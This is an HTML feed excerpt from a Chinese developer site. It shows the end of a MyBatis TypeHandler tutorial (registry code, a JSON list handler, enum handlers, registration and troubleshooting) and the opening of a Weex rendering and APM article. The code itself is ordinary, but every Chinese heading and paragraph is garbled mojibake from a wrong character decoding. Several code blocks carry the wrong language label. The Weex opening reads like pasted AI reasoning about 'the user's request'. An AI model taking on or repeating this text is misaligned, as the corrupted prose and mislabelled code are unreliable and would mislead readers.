    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;JdbcType, TypeHandler&lt;?&gt;&gt; 
        jdbcTypeHandlerMap = <span class="hljs-keyword">new</span> EnumMap&lt;&gt;(JdbcType.<span class="hljs-keyword">class</span>);

    <span class="hljs-comment">// Javaç±»å‹ â†’ (JDBCç±»å‹ â†’ TypeHandler)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;Type, Map&lt;JdbcType, TypeHandler&lt;?&gt;&gt;&gt; 
        typeHandlerMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();

    <span class="hljs-comment">// Javaç±»å‹ â†’ é»˜è®¤TypeHandler</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;Class&lt;?&gt;, TypeHandler&lt;?&gt;&gt; 
        allTypeHandlersMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TypeHandlerRegistry</span><span class="hljs-params">()</span></span>{
        <span class="hljs-comment">// æ³¨å†Œæ‰€æœ‰å†…ç½®TypeHandler</span>
        <span class="hljs-built_in">register</span>(Boolean.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">BooleanTypeHandler</span>());
        <span class="hljs-built_in">register</span>(Integer.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">IntegerTypeHandler</span>());
        <span class="hljs-built_in">register</span>(Long.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">LongTypeHandler</span>());
        <span class="hljs-built_in">register</span>(<span class="hljs-type">String</span>.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">StringTypeHandler</span>());
        <span class="hljs-built_in">register</span>(Date.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">DateTypeHandler</span>());
        <span class="hljs-comment">// ... æ›´å¤šæ³¨å†Œ</span>
    }
}
</code></pre>
<h2 data-id="heading-20">æ³¨å†ŒTypeHandlerçš„å››ç§æ–¹å¼</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-built_in">void</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">
    Class&lt;T&gt; javaType, 
    TypeHandler&lt;? <span class="hljs-keyword">extends</span> T&gt; typeHandler</span>) {
    <span class="hljs-title function_">register</span>((<span class="hljs-title class_">Type</span>) javaType, typeHandler);
}
<span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-built_in">void</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">
    Class&lt;T&gt; <span class="hljs-keyword">type</span>, 
    JdbcType jdbcType, 
    TypeHandler&lt;? <span class="hljs-keyword">extends</span> T&gt; typeHandler</span>) {
    <span class="hljs-title function_">register</span>((<span class="hljs-title class_">Type</span>) <span class="hljs-keyword">type</span>, jdbcType, typeHandler);
}
<span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-built_in">void</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">
    TypeReference&lt;T&gt; javaTypeReference, 
    TypeHandler&lt;? <span class="hljs-keyword">extends</span> T&gt; typeHandler</span>) {
    <span class="hljs-title function_">register</span>(javaTypeReference.<span class="hljs-title function_">getRawType</span>(), 
             typeHandler);
}
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">register</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> packageName</span>) {
    <span class="hljs-title class_">ResolverUtil</span>&lt;<span class="hljs-title class_">Class</span>&lt;?&gt;&gt; resolverUtil = 
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResolverUtil</span>&lt;&gt;();
    resolverUtil.<span class="hljs-title function_">find</span>(
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResolverUtil</span>.<span class="hljs-title class_">IsA</span>(<span class="hljs-title class_">TypeHandler</span>.<span class="hljs-property">class</span>), 
        packageName);

    <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">Class</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Class</span>&lt;?&gt;&gt;&gt; handlerSet = 
        resolverUtil.<span class="hljs-title function_">getClasses</span>();

    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Class</span>&lt;?&gt; <span class="hljs-keyword">type</span> : handlerSet) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">type</span>.<span class="hljs-title function_">isAnonymousClass</span>() &amp;&amp; 
            !<span class="hljs-keyword">type</span>.<span class="hljs-title function_">isInterface</span>() &amp;&amp; 
            !<span class="hljs-title class_">Modifier</span>.<span class="hljs-title function_">isAbstract</span>(<span class="hljs-keyword">type</span>.<span class="hljs-title function_">getModifiers</span>())) {
            <span class="hljs-title function_">register</span>(<span class="hljs-keyword">type</span>);
        }
    }
}
</code></pre>
<h2 data-id="heading-21">æŸ¥æ‰¾TypeHandler</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ ¹æ®Javaç±»å‹å’ŒJDBCç±»å‹æŸ¥æ‰¾</span>
<span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-title class_">TypeHandler</span>&lt;T&gt; <span class="hljs-title function_">getTypeHandler</span>(<span class="hljs-params">
    Class&lt;T&gt; <span class="hljs-keyword">type</span>, JdbcType jdbcType</span>) {

    <span class="hljs-comment">// 1. ä»Javaç±»å‹æ˜ å°„ä¸­æŸ¥æ‰¾</span>
    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">JdbcType</span>, <span class="hljs-title class_">TypeHandler</span>&lt;?&gt;&gt; jdbcHandlerMap = 
        typeHandlerMap.<span class="hljs-title function_">get</span>(<span class="hljs-keyword">type</span>);

    <span class="hljs-keyword">if</span> (jdbcHandlerMap != <span class="hljs-literal">null</span>) {
        <span class="hljs-title class_">TypeHandler</span>&lt;?&gt; handler = 
            jdbcHandlerMap.<span class="hljs-title function_">get</span>(jdbcType);
        <span class="hljs-keyword">if</span> (handler != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> (<span class="hljs-title class_">TypeHandler</span>&lt;T&gt;) handler;
        }
    }

    <span class="hljs-comment">// 2. æŸ¥æ‰¾é»˜è®¤TypeHandler</span>
    <span class="hljs-keyword">return</span> (<span class="hljs-title class_">TypeHandler</span>&lt;T&gt;) <span class="hljs-title function_">getTypeHandler</span>((<span class="hljs-title class_">Type</span>) <span class="hljs-keyword">type</span>);
}
</code></pre>
<h2 data-id="heading-22">ä¸ƒã€è‡ªå®šä¹‰TypeHandler</h2>
<p>å½“å†…ç½®TypeHandleræ— æ³•æ»¡è¶³éœ€æ±‚æ—¶ï¼Œå¯ä»¥è‡ªå®šä¹‰TypeHandlerã€‚</p>
<h2 data-id="heading-23">å®ç°TypeHandleræ¥å£</h2>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªJSONç±»å‹å¤„ç†å™¨çš„å®Œæ•´ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@MappedTypes(List.class)</span>
<span class="hljs-meta">@MappedJdbcTypes(JdbcType.VARCHAR)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JsonListTypeHandler</span> 
    <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTypeHandler</span>&lt;List&lt;String&gt;&gt; {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Gson</span> <span class="hljs-variable">GSON</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Gson</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Type</span> <span class="hljs-variable">LIST_TYPE</span> <span class="hljs-operator">=</span> 
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeToken</span>&lt;List&lt;String&gt;&gt;(){}.getType();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNonNullParameter</span><span class="hljs-params">(
        PreparedStatement ps, <span class="hljs-type">int</span> i, 
        List&lt;String&gt; parameter, JdbcType jdbcType)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// List&lt;String&gt; â†’ JSONå­—ç¬¦ä¸²</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> GSON.toJson(parameter);
        ps.setString(i, json);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
        ResultSet rs, String columnName)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// JSONå­—ç¬¦ä¸² â†’ List&lt;String&gt;</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> rs.getString(columnName);
        <span class="hljs-keyword">return</span> parseJson(json);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
        ResultSet rs, <span class="hljs-type">int</span> columnIndex)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> rs.getString(columnIndex);
        <span class="hljs-keyword">return</span> parseJson(json);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
        CallableStatement cs, <span class="hljs-type">int</span> columnIndex)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> cs.getString(columnIndex);
        <span class="hljs-keyword">return</span> parseJson(json);
    }

    <span class="hljs-keyword">private</span> List&lt;String&gt; <span class="hljs-title function_">parseJson</span><span class="hljs-params">(String json)</span> {
        <span class="hljs-keyword">if</span> (json == <span class="hljs-literal">null</span> || json.trim().isEmpty()) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        <span class="hljs-keyword">return</span> GSON.fromJson(json, LIST_TYPE);
    }
}
</code></pre>
<h2 data-id="heading-24">æšä¸¾ç±»å‹å¤„ç†</h2>
<p>MyBatisæä¾›äº†ä¸¤ç§æšä¸¾ç±»å‹å¤„ç†å™¨ï¼š</p>
<pre><code class="hljs language-scala" lang="scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EnumTypeHandler&lt;E</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Enum&lt;E&gt;&gt;</span> </span>
    <span class="hljs-keyword">extends</span> <span class="hljs-type">BaseTypeHandler</span>&lt;<span class="hljs-type">E</span>&gt; {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span>&lt;<span class="hljs-type">E</span>&gt; <span class="hljs-class"><span class="hljs-keyword">type</span></span>;

    <span class="hljs-meta">@Override</span>
    public void setNonNullParameter(
        <span class="hljs-type">PreparedStatement</span> ps, int i, 
        <span class="hljs-type">E</span> parameter, <span class="hljs-type">JdbcType</span> jdbcType) 
        <span class="hljs-keyword">throws</span> <span class="hljs-type">SQLException</span> {
        <span class="hljs-comment">// Enum â†’ name (VARCHAR)</span>
        ps.setString(i, parameter.name());
    }

    <span class="hljs-meta">@Override</span>
    public <span class="hljs-type">E</span> getNullableResult(
        <span class="hljs-type">ResultSet</span> rs, <span class="hljs-type">String</span> columnName) 
        <span class="hljs-keyword">throws</span> <span class="hljs-type">SQLException</span> {
        <span class="hljs-comment">// name â†’ Enum</span>
        <span class="hljs-type">String</span> name = rs.getString(columnName);
        <span class="hljs-keyword">return</span> name == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : 
               <span class="hljs-type">Enum</span>.valueOf(<span class="hljs-class"><span class="hljs-keyword">type</span>, <span class="hljs-title">name</span>)</span>;
    }
}
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EnumOrdinalTypeHandler&lt;E</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Enum&lt;E&gt;&gt;</span> </span>
    <span class="hljs-keyword">extends</span> <span class="hljs-type">BaseTypeHandler</span>&lt;<span class="hljs-type">E</span>&gt; {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span>&lt;<span class="hljs-type">E</span>&gt; <span class="hljs-class"><span class="hljs-keyword">type</span></span>;

    <span class="hljs-meta">@Override</span>
    public void setNonNullParameter(
        <span class="hljs-type">PreparedStatement</span> ps, int i, 
        <span class="hljs-type">E</span> parameter, <span class="hljs-type">JdbcType</span> jdbcType) 
        <span class="hljs-keyword">throws</span> <span class="hljs-type">SQLException</span> {
        <span class="hljs-comment">// Enum â†’ ordinal (INTEGER)</span>
        ps.setInt(i, parameter.ordinal());
    }

    <span class="hljs-meta">@Override</span>
    public <span class="hljs-type">E</span> getNullableResult(
        <span class="hljs-type">ResultSet</span> rs, <span class="hljs-type">String</span> columnName) 
        <span class="hljs-keyword">throws</span> <span class="hljs-type">SQLException</span> {
        <span class="hljs-comment">// ordinal â†’ Enum</span>
        int ordinal = rs.getInt(columnName);
        <span class="hljs-keyword">if</span> (ordinal == <span class="hljs-number">0</span> &amp;&amp; rs.wasNull()) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        <span class="hljs-type">E</span>[] enums = <span class="hljs-keyword">type</span>.getEnumConstants();
        <span class="hljs-keyword">return</span> enums[ordinal];
    }
}
</code></pre>
<h2 data-id="heading-25">æ³¨å†Œè‡ªå®šä¹‰TypeHandlerçš„ä¸‰ç§æ–¹å¼</h2>
<pre><code class="hljs language-xml" lang="xml">@MappedTypes(List.class)
@MappedJdbcTypes(JdbcType.VARCHAR)
public class JsonListTypeHandler 
    extends BaseTypeHandler&lt;List<span class="hljs-tag">&lt;<span class="hljs-name">String</span>&gt;</span>&gt; {
    // å®ç°ä»£ç ...
}
<span class="hljs-tag">&lt;<span class="hljs-name">typeHandlers</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- æŒ‡å®šç±»å --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">typeHandler</span> 
        <span class="hljs-attr">handler</span>=<span class="hljs-string">"com.example.JsonListTypeHandler"</span>/&gt;</span>

    <span class="hljs-comment">&lt;!-- æŒ‡å®šJavaç±»å‹å’ŒJDBCç±»å‹ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">typeHandler</span> 
        <span class="hljs-attr">javaType</span>=<span class="hljs-string">"java.util.List"</span>
        <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">"VARCHAR"</span>
        <span class="hljs-attr">handler</span>=<span class="hljs-string">"com.example.JsonListTypeHandler"</span>/&gt;</span>

    <span class="hljs-comment">&lt;!-- åŒ…æ‰«æ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"com.example.typehandler"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">typeHandlers</span>&gt;</span>
@Configuration
public class MyBatisConfig {
    @Bean
    public ConfigurationCustomizer 
        configurationCustomizer() {
        return configuration -&gt; {
            TypeHandlerRegistry registry = 
                configuration.getTypeHandlerRegistry();
            registry.register(
                List.class, 
                JdbcType.VARCHAR, 
                new JsonListTypeHandler()
            );
        };
    }
}
</code></pre>
<h2 data-id="heading-26">å…«ã€æœ€ä½³å®è·µ</h2>
<h2 data-id="heading-27">é—®é¢˜1ï¼šç±»å‹è½¬æ¢å¼‚å¸¸</h2>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span> é—®é¢˜ï¼šCannot <span class="hljs-keyword">convert</span> <span class="hljs-keyword">value</span> <span class="hljs-string">'0000'</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">column</span> <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-type">TIMESTAMP</span>
<span class="hljs-operator">/</span><span class="hljs-operator">/</span> åŸå› ï¼šæ—¥æœŸæ ¼å¼ä¸åŒ¹é…
<span class="hljs-operator">/</span><span class="hljs-operator">/</span> è§£å†³ï¼šä½¿ç”¨æ­£ç¡®çš„æ—¥æœŸç±»å‹æˆ–è‡ªå®šä¹‰TypeHandler
</code></pre>
<h2 data-id="heading-28">é—®é¢˜2ï¼šNullå€¼å¤„ç†</h2>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// é—®é¢˜ï¼šJDBC requires that the JdbcType must be specified</span>
<span class="hljs-comment">// è§£å†³1ï¼šæŒ‡å®šjdbcType</span>
<span class="hljs-meta">#{name, jdbcType=VARCHAR}</span>

<span class="hljs-comment">// è§£å†³2ï¼šå…¨å±€é…ç½®</span>
&lt;setting name=<span class="hljs-string">"jdbcTypeForNull"</span> <span class="hljs-keyword">value</span>=<span class="hljs-string">"NULL"</span>/&gt;
</code></pre>
<h2 data-id="heading-29">é—®é¢˜3ï¼šæšä¸¾ç±»å‹å¤„ç†</h2>
<pre><code class="hljs language-ini" lang="ini">// é…ç½®é»˜è®¤æšä¸¾å¤„ç†å™¨
&lt;settings&gt;
    &lt;setting <span class="hljs-attr">name</span>=<span class="hljs-string">"defaultEnumTypeHandler"</span> value=<span class="hljs-string">"org.apache.ibatis.type.EnumTypeHandler"</span>/&gt;
&lt;/settings&gt;

// æˆ–åœ¨ResultMapä¸­æŒ‡å®š
&lt;result <span class="hljs-attr">column</span>=<span class="hljs-string">"status"</span> property=<span class="hljs-string">"status"</span>
         <span class="hljs-attr">typeHandler</span>=<span class="hljs-string">"org.apache.ibatis.type.EnumOrdinalTypeHandler"</span>/&gt;
</code></pre>
<h2 data-id="heading-30">ä¹ã€æ€»ç»“</h2>
<p>MyBatisçš„ç±»å‹å¤„ç†æ¨¡å—æ˜¯æ•´ä¸ªæ¡†æ¶çš„åŸºç¡€ç»„ä»¶ï¼Œé€šè¿‡ç²¾å¿ƒè®¾è®¡çš„TypeHandlerä½“ç³»ï¼Œå®ç°äº†Javaç±»å‹ä¸JDBCç±»å‹çš„æ— ç¼è½¬æ¢ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Weex åº•å±‚åŸç†ä¸ APM]]></title>    <link>https://juejin.cn/post/7590575755491328054</link>    <guid>https://juejin.cn/post/7590575755491328054</guid>    <pubDate>2026-01-02T02:21:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590575755491328054" data-draft-id="7589916567876354090" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Weex åº•å±‚åŸç†ä¸ APM"/> <meta itemprop="keywords" content="å‰ç«¯æ¡†æ¶,iOS,Weex"/> <meta itemprop="datePublished" content="2026-01-02T02:21:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ­åŸå°åˆ˜"/> <meta itemprop="url" content="https://juejin.cn/user/3175045309408429"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Weex åº•å±‚åŸç†ä¸ APM
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3175045309408429/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ­åŸå°åˆ˜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T02:21:46.000Z" title="Fri Jan 02 2026 02:21:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»42åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä» Vue ç»„ä»¶åº“ï¼ˆVue Libï¼‰åˆ° Weex æ¸²æŸ“ä¸º iOS åŸç”Ÿ UIKit å…ƒç´ ï¼Œæ ¸å¿ƒæ˜¯ â€œVirtual DOM â†’ è·¨çº¿ç¨‹é€šä¿¡ â†’ Native DOM æ„å»º â†’ å¸ƒå±€è®¡ç®— â†’ åŸç”Ÿ View æ¸²æŸ“ â†’ äº‹ä»¶åå‘ç»‘å®šâ€ çš„å®Œæ•´é“¾è·¯ã€‚Weex ä½œä¸ºä¸­é—´å±‚ï¼Œä¸»è¦å®Œæˆ 7 å¤§æ ¸å¿ƒå·¥ä½œï¼Œæ¥ä¸‹å»çœ‹çœ‹è¯¦ç»†å†…å®¹.</p>
<p>Weex ä¾§ APM è¯¥æ€ä¹ˆå¼€å±•ï¼Ÿ</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€æ ¸å¿ƒæ­¥éª¤</h2>
<p>ä» Vue Lib åˆ° Weex åŸç”Ÿ UIKit å…ƒç´ çš„å®Œæ•´æµç¨‹ã€‚</p>
<p>é¦–å…ˆï¼Œç”¨æˆ·çš„éœ€æ±‚æ˜¯ â€œåˆ—ä¸¾ Weex åšçš„äº‹æƒ…â€ å¹¶ â€œç»“åˆæœ€æ–°æºç æ ‡ä½ç½®â€ï¼Œæ‰€ä»¥æ€è€ƒè¿‡ç¨‹è¦å…ˆæ‹†è§£æµç¨‹ï¼šä» Vue ç¼–è¯‘äº§ç‰©å¤„ç†ã€JS-Native é€šä¿¡ã€Virtual DOM è§£æã€DOM æ„å»ºä¸å¸ƒå±€è®¡ç®—ã€æ¸²æŸ“æŒ‡ä»¤ç”Ÿæˆã€åŸç”Ÿ View åˆ›å»ºä¸æ›´æ–°ï¼Œè¿™å‡ ä¸ªæ ¸å¿ƒæ­¥éª¤ã€‚æ¯ä¸ªæ­¥éª¤éƒ½è¦å¯¹åº” Weex çš„å…·ä½“å·¥ä½œï¼Œè¿˜è¦æ‰¾åˆ°æœ€æ–°æºç ä¸­çš„å¯¹åº”ç±»å’Œæ–¹æ³•ã€‚</p>
<p>ç¬¬ä¸€æ­¥ï¼Œåº”è¯¥æ˜¯ Vue ç¼–è¯‘äº§ç‰©çš„é€‚é…ã€‚å› ä¸º Vue å†™çš„ä»£ç è¦è¢« Weex è¯†åˆ«ï¼ŒWeex éœ€è¦å¤„ç† Vue çš„æ¨¡æ¿ç¼–è¯‘ç»“æœï¼ˆæ¯”å¦‚ render å‡½æ•°ç”Ÿæˆçš„ Virtual DOMï¼‰ï¼Œè¿˜è¦æ³¨å…¥ Weex çš„ JS Runtime APIã€‚è¿™é‡Œè¦æ‰¾æœ€æ–°æºç ä¸­ JS Runtime çš„åˆå§‹åŒ–ç±»ï¼Œæ¯”å¦‚ WXJSContext æˆ– WXBridgeCoreï¼Œå› ä¸º JS ç¯å¢ƒçš„æ­å»ºæ˜¯ç¬¬ä¸€æ­¥ã€‚</p>
<p>ç¬¬äºŒæ­¥ï¼ŒJS-Native é€šä¿¡çš„å»ºç«‹ã€‚Vue çš„ Virtual DOM å˜åŒ–éœ€è¦ä¼ é€’ç»™ Nativeï¼Œæ‰€ä»¥ Weex çš„ Bridge æ ¸å¿ƒè¦æ³¨å†Œé€šä¿¡æ–¹æ³•ï¼ˆæ¯”å¦‚ callNativeï¼‰ï¼Œè¿™é‡Œå¯¹åº” WXBridgeCore çš„ invokeNative æ–¹æ³•ï¼Œä¹‹å‰è®¨è®ºè¿‡ bridge é˜Ÿåˆ—ï¼Œè¿™é‡Œè¦ç»“åˆæœ€æ–°æºç ä¸­é€šä¿¡ä»»åŠ¡çš„è°ƒåº¦ã€‚</p>
